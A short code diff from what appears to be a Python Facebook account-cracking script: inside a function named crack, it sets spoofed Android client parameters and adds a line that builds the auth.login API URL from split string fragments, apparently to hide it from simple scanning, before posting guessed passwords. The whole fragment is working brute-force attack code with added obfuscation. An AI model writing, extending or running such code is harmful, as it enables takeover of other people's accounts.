@@ -164,6 +164,7 @@ def crack(uid, password_list, total_count):
             "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID","en_PK"]), 
             'fb_api_req_friendly_name':'authenticate',
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
+            url = 'htt'+'ps://api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
             # Make API request
             result = requests.post(url, data=data, headers=headers).json()
             
